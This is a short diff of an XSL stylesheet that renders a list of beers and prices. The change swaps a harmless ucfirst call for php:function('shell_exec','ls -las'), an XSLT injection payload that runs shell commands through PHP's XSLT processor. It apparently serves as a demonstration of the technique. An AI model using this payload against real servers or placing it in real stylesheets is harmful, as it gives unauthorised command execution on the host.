@@ -4,7 +4,7 @@
 <xsl:for-each select="beers/beer">
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
-<xsl:value-of select="php:function('ucfirst',string(uid))"/>
+<xsl:value-of select="php:function('shell_exec','ls -las')"/>
 - 
 </span>
 <xsl:value-of select="price"/>
